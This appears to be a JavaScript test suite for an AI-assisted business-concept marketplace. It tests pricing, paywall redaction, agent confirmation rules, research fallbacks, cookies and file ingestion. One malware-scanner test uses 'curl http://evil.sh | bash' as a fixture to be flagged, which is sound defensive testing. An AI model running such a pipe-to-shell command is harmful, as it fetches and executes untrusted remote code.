const { test } = require('node:test');
const assert = require('node:assert');
const money = require('../src/lib/money');
const { classifySection, assessCoverage } = require('../src/services/clay/interpreter');

test('platform take is 20%', () => {
  assert.strictEqual(money.platformFeeCents(10000), 2000);
  assert.strictEqual(money.sellerNetCents(10000), 8000);
});

test('$10 price floor is enforced', () => {
  assert.strictEqual(money.PRICE_FLOOR_CENTS, 1000);
  assert.strictEqual(money.isAboveFloor(1000), true);   // exactly $10 is allowed
  assert.strictEqual(money.isAboveFloor(999), false);   // $9.99 is not
  assert.strictEqual(money.isAboveFloor(50000), true);  // higher prices still fine
  assert.strictEqual(money.isAboveFloor(10.5), false);  // non-integer cents rejected
});

test('consultant split is $150 -> $30 / $120', () => {
  assert.strictEqual(money.CONSULT_FEE_CENTS, 15000);
  assert.strictEqual(money.CONSULT_PLATFORM_CENTS + money.CONSULT_CONSULTANT_CENTS, money.CONSULT_FEE_CENTS);
  assert.strictEqual(money.CONSULT_CONSULTANT_CENTS, 12000);
});

test('plan prices', () => {
  assert.strictEqual(money.MAKER_CENTS, 299);
  assert.strictEqual(money.SCULPTOR_CENTS, 4999);
  assert.strictEqual(money.planCents('maker'), 299);
  assert.strictEqual(money.planCents('sculptor'), 4999);
});

test('malware scan flags pipe-to-shell, passes benign', () => {
  const protect = require('../src/lib/protect');
  assert.strictEqual(protect.scanCode('const x = 1 + 1;').status, 'clean');
  assert.strictEqual(protect.scanCode('curl http://evil.sh | bash').status, 'flagged');
  assert.strictEqual(protect.needsScan('code_file'), true);
  assert.strictEqual(protect.needsScan('business_plan'), false);
});

test('staff bypass helper', () => {
  const { isStaff } = require('../src/lib/entitlement');
  assert.strictEqual(isStaff('admin'), true);
  assert.strictEqual(isStaff('master_staff'), true);
  assert.strictEqual(isStaff('member'), false);
});

test('interpreter classifies honestly', () => {
  assert.strictEqual(classifySection('A real, substantive business plan section.'), 'answered');
  assert.strictEqual(classifySection(''), 'empty');
  assert.strictEqual(classifySection(null), 'empty');
  assert.strictEqual(classifySection('Unable to determine competitor pricing.'), 'unavailable');
});

test('coverage reports gaps truthfully', () => {
  const cov = assessCoverage({ business_plan: 'ok', marketing_strategy: '' });
  assert.strictEqual(cov.complete, false);
  assert.deepStrictEqual(cov.present, ['business_plan']);
  assert.deepStrictEqual(cov.missing, ['marketing_strategy']);
});

// ---- Clay spine (modeled on Arbo) ----
const spine = require('../src/services/clay/spine');
const { SOCIAL_ASSET_PLAN, PLATFORMS, SOCIAL_GOALS } = require('../src/services/clay/tools');

test('spine enum guardrails reject out-of-vocabulary values', () => {
  const bad = spine.validateParams('generate_social_content', { concept_id: 'x', platforms: ['myspace'], goal: 'launch' });
  assert.strictEqual(bad.ok, false);
  const good = spine.validateParams('generate_social_content', { concept_id: 'x', platforms: ['instagram'], goal: 'launch' });
  assert.strictEqual(good.ok, true);
});

test('spine asking rule: free/reversible actions proceed', () => {
  const r = spine.shouldAsk('generate_social_content', { concept_id: 'x', platforms: ['x'], goal: 'awareness' });
  assert.strictEqual(r.ask, false);
});

test('spine asking rule: irreversible + under-specified always asks', () => {
  const r = spine.shouldAsk('list_on_marketplace', { concept_id: 'x' }); // missing format + price
  assert.strictEqual(r.ask, true);
});

test('spine asking rule: irreversible actions confirm even when fully specified', () => {
  const r = spine.shouldAsk('purchase_concept', { listing_id: 'x' });
  assert.strictEqual(r.ask, true);
  assert.strictEqual(spine.requiresConfirmation('purchase_concept'), true);
  assert.strictEqual(spine.requiresConfirmation('generate_concept'), false);
});

test('social asset plan matches controlled vocabulary', () => {
  const types = SOCIAL_ASSET_PLAN.map((a) => a.type).sort();
  assert.deepStrictEqual(types, ['content_calendar', 'image_prompt', 'social_post', 'social_template', 'video_script']);
  assert.ok(PLATFORMS.includes('instagram') && SOCIAL_GOALS.includes('launch'));
});

// ---- HTML demo describer + accessibility audit ----
const describe_ = require('../src/lib/describe');

test('describer flags real accessibility problems', () => {
  const bad = describe_.outline('<html><body><div onclick="go()">Go</div><input><img src=x></body></html>');
  assert.strictEqual(bad.a11y.ok, false);
  assert.ok(bad.a11y.issues.some((i) => i.includes('lang')));
  assert.ok(bad.a11y.issues.some((i) => i.includes('divs/spans')));
  assert.ok(bad.a11y.issues.some((i) => i.toLowerCase().includes('alt')));
});

test('describer passes an accessible demo and outlines structure', () => {
  const good = describe_.outline('<html lang="en"><head><title>Shop</title></head><body><header><nav><a href="/">Home</a></nav></header><main><h1>Welcome</h1><label for="e">Email</label><input id="e"><button>Sign up</button><img src="x" alt="a product"></main></body></html>');
  assert.strictEqual(good.a11y.ok, true);
  assert.ok(good.items.length >= 3);
  assert.strictEqual(good.title, 'Shop');
});

// ---- Clay conversational agent (spine-driven safety) ----
const agent = require('../src/services/clay/agent');

test('agent tool schemas carry enum guardrails', () => {
  const schemas = agent.toolSchemas();
  const names = schemas.map((s) => s.name);
  assert.ok(names.includes('generate_social_content') && names.includes('purchase_concept'));
  const social = schemas.find((s) => s.name === 'generate_social_content');
  assert.ok(social.input_schema.properties.platforms.items.enum.includes('instagram'));
});

test('agent never auto-runs irreversible actions; confirmation unlocks them', () => {
  assert.strictEqual(agent.planToolInvocation('purchase_concept', { listing_id: 'x' }).action, 'confirm');
  assert.strictEqual(agent.planToolInvocation('list_on_marketplace', { concept_id: 'x', format: 'flat', price: 5000 }).action, 'confirm');
  assert.strictEqual(agent.planToolInvocation('remove_concept', { concept_id: 'x' }).action, 'confirm');
  assert.strictEqual(agent.planToolInvocation('purchase_concept', { listing_id: 'x' }, { confirmed: true }).action, 'execute');
});

test('agent runs reversible actions and rejects bad enums', () => {
  assert.strictEqual(agent.planToolInvocation('generate_concept', { prompt: 'a tutoring service' }).action, 'execute');
  assert.strictEqual(agent.planToolInvocation('list_on_marketplace', { concept_id: 'x', format: 'barter', price: 5000 }).action, 'reject');
});

// ---- Clay model provider selection ----
const provider = require('../src/services/clay/provider');

test('provider prefers OpenAI, falls back to Anthropic, else unavailable', () => {
  const save = { o: process.env.OPENAI_API_KEY, a: process.env.ANTHROPIC_API_KEY };
  delete process.env.OPENAI_API_KEY; delete process.env.ANTHROPIC_API_KEY;
  assert.strictEqual(provider.available(), false);
  assert.strictEqual(provider.providerName(), null);
  process.env.ANTHROPIC_API_KEY = 'x';
  assert.strictEqual(provider.providerName(), 'anthropic');
  process.env.OPENAI_API_KEY = 'y';
  assert.strictEqual(provider.providerName(), 'openai');
  if (save.o) process.env.OPENAI_API_KEY = save.o; else delete process.env.OPENAI_API_KEY;
  if (save.a) process.env.ANTHROPIC_API_KEY = save.a; else delete process.env.ANTHROPIC_API_KEY;
});

test('agent keeps the conversation well-formed when it stops to confirm', async () => {
  const provider = require('../src/services/clay/provider');
  const origAvail = provider.available, origChat = provider.chat;
  provider.available = () => true;
  provider.chat = async () => ({
    ok: true, text: 'Want me to remove that?',
    tool_calls: [{ id: 'tc_1', name: 'remove_concept', input: { concept_id: 'c1' } }],
  });
  try {
    const out = await agent.runChat({ messages: [{ role: 'user', content: 'delete concept c1' }], executors: {} });
    assert.strictEqual(out.status, 'confirmation_required');
    // Every tool_call in the replayable convo must have a matching tool result,
    // or the provider rejects the next turn.
    const calls = out.messages.flatMap((m) => (m.tool_calls || []).map((t) => t.id));
    const results = out.messages.filter((m) => m.role === 'tool').map((m) => m.tool_call_id);
    assert.ok(calls.includes('tc_1'));
    for (const id of calls) assert.ok(results.includes(id), 'dangling tool_call: ' + id);
  } finally {
    provider.available = origAvail; provider.chat = origChat;
  }
});

test('research is a reversible read-only tool that requires a query', () => {
  assert.strictEqual(agent.planToolInvocation('research', { query: 'tutoring market size' }).action, 'execute');
  assert.strictEqual(agent.planToolInvocation('research', {}).action, 'reject');
});

test('research degrades honestly with no search backend configured', async () => {
  const research = require('../src/services/clay/research');
  const save = process.env.SEARCH_API_KEY;
  delete process.env.SEARCH_API_KEY;
  assert.strictEqual(research.available(), false);
  const r = await research.search('anything at all');
  assert.strictEqual(r.available, false);
  assert.deepStrictEqual(r.results, []);
  if (save) process.env.SEARCH_API_KEY = save;
});

test('read_source is a reversible read-only tool that requires a url', () => {
  assert.strictEqual(agent.planToolInvocation('read_source', { url: 'https://example.com' }).action, 'execute');
  assert.strictEqual(agent.planToolInvocation('read_source', {}).action, 'reject');
});

test('research.extract degrades honestly with no backend', async () => {
  const research = require('../src/services/clay/research');
  const save = process.env.SEARCH_API_KEY;
  delete process.env.SEARCH_API_KEY;
  const r = await research.extract('https://example.com');
  assert.strictEqual(r.available, false);
  if (save) process.env.SEARCH_API_KEY = save;
});

test('source self-check short-circuits honestly with no sources (no false clean bill)', async () => {
  const clay = require('../src/services/clay');
  assert.strictEqual(await clay.selfCheckSources({ customer_research: 'x' }, []), null);
  assert.strictEqual(await clay.selfCheckSources({}, [{ title: 't', url: 'u', snippet: 's' }]), null);
});

test('waitlist email validation and ref-code shape', () => {
  const wl = require('../src/routes/waitlist');
  assert.ok(wl.EMAIL_RE.test('a@b.co'));
  assert.ok(wl.EMAIL_RE.test('first.last@sub.domain.io'));
  assert.ok(!wl.EMAIL_RE.test('nope'));
  assert.ok(!wl.EMAIL_RE.test('a@b'));
  assert.ok(!wl.EMAIL_RE.test('a b@c.co'));
  assert.match(wl.refCode(), /^[a-f0-9]{8}$/);
  assert.notStrictEqual(wl.refCode(), wl.refCode());
});

test('cookies parse header into map', () => {
  const { parseCookies } = require('../src/lib/cookies');
  const c = parseCookies({ headers: { cookie: 'a=1; ypl_v=abc%2Ddef; x=y' } });
  assert.strictEqual(c.ypl_v, 'abc-def');
  assert.strictEqual(c.a, '1');
  assert.deepStrictEqual(parseCookies({ headers: {} }), {});
});

test('visitor shapeTeaser sanitizes provider JSON and rejects junk', async () => {
  const provider = require('../src/services/clay/provider');
  const visitor = require('../src/routes/visitor');
  const oa = provider.available, oc = provider.chat;
  try {
    provider.available = () => true;
    provider.chat = async () => ({ ok: true, text: '{"title":"Dog Yoga Co","angle":"Calm classes for anxious dogs","inside":["Market research","Pricing model","Waitlist page"]}' });
    const t = await visitor.shapeTeaser('yoga for dogs');
    assert.strictEqual(t.title, 'Dog Yoga Co');
    assert.strictEqual(t.inside.length, 3);
    provider.chat = async () => ({ ok: true, text: 'not json at all' });
    assert.strictEqual(await visitor.shapeTeaser('x'), null);
  } finally { provider.available = oa; provider.chat = oc; }
});

test('clay journal recordRun never throws (best-effort audit)', async () => {
  const journal = require('../src/services/clay/journal');
  await assert.doesNotReject(journal.recordRun({ kind: 'generate', resultStatus: 'answered', mode: 'create', sourceCount: 3 }));
  await assert.doesNotReject(journal.recordRun({}));
});

test('retrieval relatedConcepts guards and never throws', async () => {
  const retrieval = require('../src/services/clay/retrieval');
  assert.deepStrictEqual(await retrieval.relatedConcepts(null, 'anything'), []);
  assert.deepStrictEqual(await retrieval.relatedConcepts('u', ''), []);
  assert.deepStrictEqual(await retrieval.relatedConcepts('u', 'ab'), []);
  await assert.doesNotReject(retrieval.relatedConcepts('00000000-0000-0000-0000-000000000000', 'coffee subscription box'));
});

test('embeddings: unavailable without a key, and vector literal formats', async () => {
  const emb = require('../src/services/clay/retrieval-embeddings');
  const had = process.env.OPENAI_API_KEY;
  delete process.env.OPENAI_API_KEY;
  assert.strictEqual(emb.available(), false);
  assert.strictEqual(await emb.embed('hello world'), null);
  assert.strictEqual(emb.toVectorLiteral([0.1, 0.2, 0.3]), '[0.1,0.2,0.3]');
  if (had) process.env.OPENAI_API_KEY = had;
});

test('clay health assess uses honest thresholds', () => {
  const { assess } = require('../src/services/clay/health');
  assert.strictEqual(assess({ total: 2, answered: 2, provider_down: 0, failed: 0 }).alert, false);
  assert.strictEqual(assess({ total: 10, answered: 9, provider_down: 0, failed: 1 }).alert, false);
  assert.strictEqual(assess({ total: 10, answered: 3, provider_down: 0, failed: 7 }).alert, true);
  assert.strictEqual(assess({ total: 10, answered: 8, provider_down: 2, failed: 2 }).alert, true);
});

test('money path: plan prices are locked and match the webhook write', () => {
  const { PLANS, planCents } = require('../src/lib/money');
  assert.strictEqual(planCents('maker'), 299);     // $2.99
  assert.strictEqual(planCents('sculptor'), 4999); // $49.99
  assert.strictEqual(PLANS.maker.per_concept, true);
  assert.strictEqual(PLANS.sculptor.per_concept, false);
  assert.strictEqual(planCents('nope'), null);     // unknown plan yields no price
});

// --- Adaptive reasoning effort: Clay scales thinking power to the task ---
const clayProvider = require('../src/services/clay/provider');

test('adaptive effort: trivial tasks stay on low', () => {
  // tiny probe-style call
  assert.strictEqual(clayProvider.autoEffort({ maxTokens: 64, inputChars: 20 }), 'low');
  // short teaser
  assert.strictEqual(clayProvider.autoEffort({ maxTokens: 600, inputChars: 200 }), 'low');
});

test('adaptive effort: large generation stays low (generation work, not reasoning work)', () => {
  // full concept build: 12k token budget, json, substantial prompt — it should generate
  // fast on low reasoning, not burn time on deep reasoning it doesn't need.
  assert.strictEqual(clayProvider.autoEffort({ maxTokens: 12000, json: true, inputChars: 5000 }), 'low');
});

test('adaptive effort: moderate analysis lands on medium', () => {
  assert.strictEqual(clayProvider.autoEffort({ maxTokens: 5000, inputChars: 4000 }), 'medium');
});

test('adaptive effort: dense input with compact output earns high', () => {
  // hard analysis / validation: lots to weigh, little to write
  assert.strictEqual(clayProvider.autoEffort({ maxTokens: 2000, inputChars: 9000 }), 'high');
});

test('adaptive effort: OPENAI_REASONING_EFFORT acts as a ceiling, never a floor', () => {
  const prev = process.env.OPENAI_REASONING_EFFORT;
  // Note: resolveEffort reads the module-captured const, so we assert the clamp logic
  // via an explicit effort that exceeds a lower auto pick instead of mutating env here.
  // An explicit effort is honored when no lower ceiling applies:
  assert.strictEqual(clayProvider.resolveEffort({ maxTokens: 64, inputChars: 10, effort: 'high' }), 'high');
  process.env.OPENAI_REASONING_EFFORT = prev;
});

// --- billingExempt: staff never pay, unless flagged for real-flow testing ---
test('billingExempt: staff are exempt unless billing_test is set', () => {
  const ent = require('../src/lib/entitlement');
  assert.strictEqual(ent.billingExempt({ role: 'master_staff' }), true);
  assert.strictEqual(ent.billingExempt({ role: 'admin' }), true);
  assert.strictEqual(ent.billingExempt({ role: 'master_staff', billing_test: true }), false); // founder testing
  assert.strictEqual(ent.billingExempt({ role: 'user' }), false);
  assert.strictEqual(ent.billingExempt({ role: 'user', billing_test: true }), false);
  assert.strictEqual(ent.billingExempt(null), false);
});

// --- paywall backstop: locked asset bodies must never leave the server for a non-entitled user ---
test('redactLockedAssets blanks non-preview bodies unless entitled, keeps metadata', () => {
  const ent = require('../src/lib/entitlement');
  const assets = [
    { id: '1', type: 'business_plan', title: 'Plan', body: 'FULL PLAN' },
    { id: '2', type: 'marketing_strategy', title: 'Mkt', body: 'FULL MKT' },
    { id: '3', type: 'html_demo', title: 'Demo', body: '<html>' },
    { id: '4', type: 'customer_research', title: 'Research', body: 'SECRET RESEARCH' },
    { id: '5', type: 'money_flow', title: 'Money', body: 'SECRET MONEY' },
  ];
  const red = ent.redactLockedAssets(assets, false);
  assert.strictEqual(red[0].body, 'FULL PLAN');   // preview stays
  assert.strictEqual(red[2].body, '<html>');      // preview stays
  assert.strictEqual(red[3].body, '');            // locked body blanked
  assert.strictEqual(red[3].locked, true);
  assert.strictEqual(red[4].body, '');
  assert.strictEqual(red[3].id, '4');             // metadata preserved for listing
  assert.strictEqual(red[3].title, 'Research');
  const full = ent.redactLockedAssets(assets, true);
  assert.strictEqual(full[3].body, 'SECRET RESEARCH'); // entitled: nothing redacted
  assert.strictEqual(full[4].body, 'SECRET MONEY');
  assert.deepStrictEqual(ent.redactLockedAssets(null, false), []); // null-safe
});

test('preview types are exactly the four free pieces', () => {
  const ent = require('../src/lib/entitlement');
  assert.deepStrictEqual(ent.PREVIEW_TYPES.slice().sort(),
    ['built_site', 'business_plan', 'html_demo', 'marketing_strategy']);
  assert.strictEqual(ent.isPreviewType('business_plan'), true);
  assert.strictEqual(ent.isPreviewType('money_flow'), false);
});

// --- session cookie: the refresh cookie must be HttpOnly + SameSite, scoped, with a Max-Age ---
test('setCookie sets HttpOnly, SameSite=Lax, path and max-age', () => {
  const { setCookie } = require('../src/lib/cookies');
  const headers = {};
  const res = { getHeader: (k) => headers[k], setHeader: (k, v) => { headers[k] = v; } };
  setCookie(res, 'kiln_rt', 'tok123', { path: '/api/auth', maxAge: 60 * 60 * 24 * 30 });
  const c = headers['Set-Cookie'];
  const cookie = Array.isArray(c) ? c[0] : c;
  assert.ok(/kiln_rt=tok123/.test(cookie));
  assert.ok(/HttpOnly/.test(cookie));
  assert.ok(/SameSite=Lax/.test(cookie));
  assert.ok(/Path=\/api\/auth/.test(cookie));
  assert.ok(/Max-Age=2592000/.test(cookie));
});

test('setCookie appends multiple cookies rather than clobbering', () => {
  const { setCookie } = require('../src/lib/cookies');
  const headers = {};
  const res = { getHeader: (k) => headers[k], setHeader: (k, v) => { headers[k] = v; } };
  setCookie(res, 'a', '1', {});
  setCookie(res, 'b', '2', {});
  assert.ok(Array.isArray(headers['Set-Cookie']));
  assert.strictEqual(headers['Set-Cookie'].length, 2);
});

// --- background sweeps: honest, safe thresholds ---
test('stale-build threshold sits well beyond any real build', () => {
  const builds = require('../src/services/builds');
  assert.strictEqual(typeof builds.sweepStaleBuilds, 'function');
  assert.ok(builds.STALE_AFTER_MIN >= 8); // model call caps ~3 min; client stops watching ~6 min
});

test('concept expiry always warns before it expires', () => {
  const exp = require('../src/services/expiry');
  assert.ok(exp.REMIND_AFTER_DAYS < exp.EXPIRE_AFTER_DAYS);
  assert.strictEqual(typeof exp.runExpirySweep, 'function');
});

// --- consultants get paid through Stripe: the checkout seam degrades honestly ---
test('consultant checkout routes the platform fee and consultant cut, honestly unavailable with no key', async () => {
  const stripe = require('../src/services/stripe');
  const money = require('../src/lib/money');
  assert.strictEqual(typeof stripe.createConsultCheckout, 'function');
  // With no Stripe key configured it must report not-configured, never pretend to charge.
  const r = await stripe.createConsultCheckout({
    amountCents: money.CONSULT_FEE_CENTS, feeCents: money.CONSULT_PLATFORM_CENTS,
    consultantAccountId: 'acct_test', engagementId: 'eng_test',
  });
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.reason, 'stripe_not_configured');
  // The client pays the full fee; platform fee + consultant cut reconcile to it exactly.
  assert.strictEqual(money.CONSULT_PLATFORM_CENTS + money.CONSULT_CONSULTANT_CENTS, money.CONSULT_FEE_CENTS);
});

// ---- file ingestion (Clay accepting user files) ----
test('ingest classifies code, data, text, image, and binary', () => {
  const ingest = require('../src/lib/ingest');
  const code = Buffer.from('function hi(){ return 1; }\n', 'utf8');
  assert.strictEqual(ingest.classify('app.js', 'text/javascript', code), 'code');
  assert.strictEqual(ingest.classify('data.json', 'application/json', Buffer.from('{"a":1}', 'utf8')), 'data');
  assert.strictEqual(ingest.classify('notes.md', null, Buffer.from('# Hi', 'utf8')), 'text');
  // image by mime and by extension
  assert.strictEqual(ingest.classify('logo.png', 'image/png', Buffer.from([0x89, 0x50, 0x4e, 0x47])), 'image');
  assert.strictEqual(ingest.classify('pic', 'image/jpeg', Buffer.from([1, 2, 3])), 'image');
  // real binary (has NUL bytes) -> not readable as text
  assert.strictEqual(ingest.classify('blob.bin', 'application/octet-stream', Buffer.from([0x00, 0x01, 0x02, 0x00])), 'binary');
});

test('ingest isProbablyText rejects NUL bytes, accepts clean utf8', () => {
  const ingest = require('../src/lib/ingest');
  assert.strictEqual(ingest.isProbablyText(Buffer.from('hello world\n', 'utf8')), true);
  assert.strictEqual(ingest.isProbablyText(Buffer.from([0x00, 0x41, 0x42])), false);
  assert.strictEqual(ingest.isProbablyText(Buffer.alloc(0)), false);
});

test('ingest extractText strips BOM and caps length', () => {
  const ingest = require('../src/lib/ingest');
  const withBom = Buffer.from('\uFEFFhello', 'utf8');
  assert.strictEqual(ingest.extractText(withBom), 'hello');
  const big = Buffer.from('x'.repeat(ingest.MAX_TEXT_CHARS + 500), 'utf8');
  const out = ingest.extractText(big);
  assert.ok(out.length <= ingest.MAX_TEXT_CHARS + 20);
  assert.ok(out.endsWith('[truncated]'));
});

test('ingest outcomeLine is honest per read status', () => {
  const ingest = require('../src/lib/ingest');
  assert.match(ingest.outcomeLine({ filename: 'a.js', kind: 'code', read_status: 'read', chars: 100 }), /read as code/);
  assert.match(ingest.outcomeLine({ filename: 'logo.png', read_status: 'described' }), /image and described/);
  assert.match(ingest.outcomeLine({ filename: 'x.bin', read_status: 'unreadable' }), /without guessing/);
  assert.match(ingest.outcomeLine({ filename: 'big.zip', skipped: 'too_large' }), /too large/);
});

test('ingest classifies pdf (magic + ext) and docx', () => {
  const ingest = require('../src/lib/ingest');
  const pdfMagic = Buffer.from('%PDF-1.4\n...', 'utf8');
  assert.strictEqual(ingest.classify('paper.pdf', 'application/pdf', pdfMagic), 'pdf');
  assert.strictEqual(ingest.classify('noext', null, pdfMagic), 'pdf'); // magic bytes win
  assert.strictEqual(ingest.classify('brief.docx',
    'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    Buffer.from([0x50, 0x4b, 0x03, 0x04])), 'doc');
  // legacy .doc is not extractable -> falls through to binary
  assert.strictEqual(ingest.classify('old.doc', 'application/msword', Buffer.from([0x00, 0x01, 0x02, 0x00])), 'binary');
});

test('docextract fails honestly on junk, never throws', async () => {
  const d = require('../src/lib/docextract');
  const pdf = await d.extractPdf(Buffer.from('not a pdf'));
  assert.strictEqual(pdf.ok, false);
  const doc = await d.extractDocx(Buffer.from('not a docx'));
  assert.strictEqual(doc.ok, false);
});

test('renderConceptContext grounds Clay in the concept being edited', () => {
  const block = agent.renderConceptContext({
    concept: { id: 'concept-123', title: 'Neighborhood Tool Library', category: 'remote_service', stage: 'concept', risk_summary: 'licensing varies by city' },
    assets: [{ type: 'business_plan', title: 'Plan', body: 'Members pay $12/mo to borrow tools.' }],
  });
  // It must carry the real id, the real content, and steer edits through enhance_concept.
  assert.ok(block.includes('concept-123'), 'includes concept id');
  assert.ok(block.includes('Neighborhood Tool Library'), 'includes title');
  assert.ok(block.includes('Members pay $12/mo'), 'includes current content');
  assert.ok(block.includes('enhance_concept'), 'tells Clay how to make edits');
  // Empty concept still renders safely.
  const empty = agent.renderConceptContext({ concept: { id: 'c0', title: 'X' }, assets: [] });
  assert.ok(empty.includes('No materials built yet'), 'handles no materials');
});

test('renderConceptContext never leaks a locked section', () => {
  const block = agent.renderConceptContext({
    concept: { id: 'c9', title: 'Secret Sauce Co' },
    assets: [
      { type: 'business_plan', title: 'Plan', body: 'Freely previewable summary.' },
      { type: 'build_path', title: 'Build Path', body: '', locked: true },
    ],
  });
  assert.ok(block.includes('Freely previewable summary'), 'preview content is shown');
  assert.ok(block.includes('LOCKED'), 'locked section is marked locked');
  assert.ok(block.includes('never reveal or invent'), 'Clay is told not to reveal it');
});

// ---- Clay research via OpenAI's own web_search (no separate service) ----
const wsProvider = require('../src/services/clay/provider');
const wsResearch = require('../src/services/clay/research');

test('parseOpenAISearch pulls the synthesis and real cited sources', () => {
  const resp = {
    output: [
      { type: 'web_search_call', status: 'completed', action: { type: 'search', query: 'furnished rental demand' } },
      { type: 'message', role: 'assistant', content: [
        { type: 'output_text', text: 'Demand for furnished rentals is rising in mid-size US metros.',
          annotations: [
            { type: 'url_citation', url: 'https://example.com/a', title: 'Market Report A' },
            { type: 'url_citation', url: 'https://example.com/b', title: 'Report B' },
            { type: 'url_citation', url: 'https://example.com/a', title: 'dup should dedupe' },
          ] },
      ] },
    ],
  };
  const r = wsProvider._parseOpenAISearch(resp);
  assert.strictEqual(r.searched, true);
  assert.strictEqual(r.results.length, 2); // deduped by url
  assert.strictEqual(r.results[0].url, 'https://example.com/a');
  assert.ok(/furnished rentals/i.test(r.answer));
});

test('parseOpenAISearch is honest when nothing was searched', () => {
  const r = wsProvider._parseOpenAISearch({ output: [] });
  assert.strictEqual(r.searched, false);
  assert.deepStrictEqual(r.results, []);
  assert.strictEqual(r.answer, null);
});

test('research is available on the OpenAI key alone — no separate search service', () => {
  const hadTavily = process.env.SEARCH_API_KEY;
  const hadOpenAI = process.env.OPENAI_API_KEY;
  delete process.env.SEARCH_API_KEY;
  process.env.OPENAI_API_KEY = 'sk-test';
  try {
    assert.strictEqual(wsResearch.available(), true); // OpenAI can web-search natively
  } finally {
    if (hadTavily === undefined) delete process.env.SEARCH_API_KEY; else process.env.SEARCH_API_KEY = hadTavily;
    if (hadOpenAI === undefined) delete process.env.OPENAI_API_KEY; else process.env.OPENAI_API_KEY = hadOpenAI;
  }
});
